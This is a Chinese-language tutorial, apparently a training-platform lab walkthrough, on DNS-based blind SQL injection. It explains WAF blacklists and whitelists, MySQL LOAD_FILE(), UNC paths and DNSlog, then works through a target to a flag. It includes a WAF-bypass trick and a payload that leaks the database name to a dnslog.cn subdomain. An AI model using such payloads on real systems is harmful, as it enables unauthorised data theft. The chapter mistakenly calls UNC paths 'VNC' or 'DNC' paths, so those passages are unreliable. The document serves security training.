# Chapter 5.3 - DNS注入

[TOC]

----

## 0x00 原理与释义

### WAF

> Web 应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF。Web 应用防火墙是通过执行一系列针对 HTTP/HTTPS 的安全策略来专门为 Web 应用提供保护的一款产品。主要用于预防SQL 注入、网页篡改、网页挂马等安全事件。

WAF部署在网页服务器的应用层，有很多种对入侵的检测技术。最常用的两种方式是**代理服务**和**特征识别**。我们在渗透测试的过程中经常说的**"过狗"**主要是实现通过特绕过特征识别进行注入，在此主要有两个概念：

#### 黑名单

黑名单指定不能通过的访问，除了黑名单外的访问均不会被拦截。

#### 白名单

白名单指定仅限通过的访问，除了白名单外的访问均会被拦截。


黑名单的缺点是对于名单以外的访问内容限制力低。白名单的优点和缺点都是对于名单外的访问内容限制高，前者体现在能够拦截大多数黑名单未及时跟进的非法访问，后者体现在用户打扰率和误判率较高。

----

### LOAD_FILE()函数

----

#### 函数功能

Load_file()函数的功能是**读取文件**并**返回文件内容**为字符串。

要使用此函数，文件必须位于服务器主机上，必须指定**完整路径**的文件，而且必须有FILE**权限**。 

----

### SMB协议与UNC路径

----

#### SMB

> SMB(全称是Server Message Block)是一个协议名，它能被用于Web连接和客户端与服务器之间的信息沟通。

SMB协议使网络共享存在一定漏洞，具体表现为允许攻击者在目标服务器和终端用户计算机上远程执行代码，影响在本地和互联网上共享的文件、设备和其它资源。

#### UNC

> 通用命名约定或统一命名约定的简称，指定了一种通用语法来描述网络资源（如共享文件，目录或打印机）的位置。

Windows系统的UNC语法具有通用形式：
```
\\\ 计算机名（网络位置）\ 共享文件夹 \ 资源
```

在我们日常使用中，`\\`用于指定网络路径，访问网络资源。

----

### DNS、DNSlog与DNS注入

---

#### DNS

> 域名系统（英文：Domain Name System，缩写：DNS）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。

DNS的作用是将网站域名与IP对应起来，使用户能通过输入域名后通过DNS解析访问到某IP的页面。

---

#### DNSlog

DNSLog 是一款监控 DNS 解析记录和 HTTP 访问记录的工具，能为无回显盲注和绕过WAF提供帮助。

由于 WEB 服务器可以通过 SMB 提供的 UNC 路径解析来选择 DNS 服务器进行解析，使得DNSlog成为**DNS代理和记录**成为可能。

> 当主机所询问的本地域名服务器不知道被查询的域名的IP地址，那么**本地域名服务器**就以**DNS客户的身份**，向其它根域名服务器继续发出查询请求报文(即替主机继续查询)，而不是让主机自己进行下一步查询。

综上所述，在发出域名解析请求时，本地域名服务器在无法获得IP的情况只会向指定提供的根域名服务器继续提交域名解析请求，那么只需要将需要注入的站点的本地域名服务器指向DNSlog代理服务器，本地服务器在无法解析的情况下必然**携带需要解析的信息到达DNSlog代理服务器**，而此工具会为我们**保留DNS解析记录**，这就帮助我们实现了DNS注入。

----

#### DNS注入

通过构造的完成的数据(SQLi+UNC路径+根域名服务器地址)访问搭建好的DNSlog服务器，此后查看DNSlog的日志即可获取我们想要得到的数据。此过程中本地DNS作为DNS客户的身份带出数据库数据，在页面无回显时很大程度上提高了盲注的效率。

---



## 0x01 注入思路

1. `用户`：绕过WAF将包含SQLi和指向DNSlog的DNC路径的组合信息发送给WEB服务器
2. `WEB服务器`：接受后传入数据库处理
3. `数据库`：**携带查询结果**访问本地DNS
4. `本地DNS服务器`：无法解析，作为DNS客户请求传送给DNSlog根域名解析服务器
5. `DNSlog`：**记录解析**请求，返回解析失败信息或WEB本地IP
6. `用户`：通过DNSlog记录分离出所需的**查询结果**

## 0x02 注入过程

1. **通过伪造的文件地址绕过WAF**

    根据apache解析特性，遇到了不认识或是不存在的内容就会顺次解析，根据网站设置而异，会规定是否允许依照这个解析模式，我们可以依靠这个绕过WAF

	![](https://nc0.cdn.zkaq.cn/md/5371/0a3b050b45d3972975dafd9338e9404b_22544.png)
	![](https://nc0.cdn.zkaq.cn/md/5371/8b1c8b791125cc75c14ab25487f4bd79_12082.png)
2. **建立带SQLi和VNC路径、DNSlog的查询语句**

   1. 拼合VNC路径标识+SQLi子查询+DNSlog，查询库名:

      ```mysql
      CONCAT('//',(SELECT database()),'.xxx.dnslog.cn/xxx')
      ```

   2. 送入`LOAD_FILE()`函数

      ```php
      and (SELECT LOAD_FILE(CONCAT('//',(SELECT database()),'.xxx.dnslog.cn/xxx')))
      ```
	    ![](https://nc0.cdn.zkaq.cn/md/5371/af0f48af0e9420d3c4eda1ef971d15bb_76272.png)

3. **查询DNSlog结果**

	![](https://nc0.cdn.zkaq.cn/md/5371/85842308f3d8b456f0d3622e8755ec0d_16316.png)

4. **不断改变SQLi语句，进一步获取表名及字段名**

   - 表名
   	![](https://nc0.cdn.zkaq.cn/md/5371/e2872e158e6388f28a9f06b831e5e87d_99251.png)
	![](https://nc0.cdn.zkaq.cn/md/5371/f8dc881a60912474b7984dc7ad0bb95b_91716.png)
   - 字段名
   	![](https://nc0.cdn.zkaq.cn/md/5371/88042098e4f90e77dbc8ed29c5a7815f_66048.png)

5. **得到flag**

	![](https://nc0.cdn.zkaq.cn/md/5371/51ad1b001eab3fccf51afce757bbd485_22709.png)
	![](https://nc0.cdn.zkaq.cn/md/5371/9a62504e2a0c0a95d737510c67a1ca21_81429.png)

## 0x03 思考与要点

1. UNC路径在实际操作中可以表现为`//`或`\\\\` ,反斜线需要四条是因为涉及到URL里的`\`同时具有转义符号的用途。
2. LOAD_FILE()函数使用之前需要MYSQL高版本数据库中带有**secure_file_priv**设置项才能实现通过数据库读取和写入数据。
3. 通常WEB服务器可处理的整个域名内的节点标签被限制在**63**个字符长度大小。
4. 由于UNC路径规定了**主机地址**和**访问资源**的参数，所以在使用DNS注入时必须加上访问的资源地址（可伪造）。

---

> 引用部分自百度百科



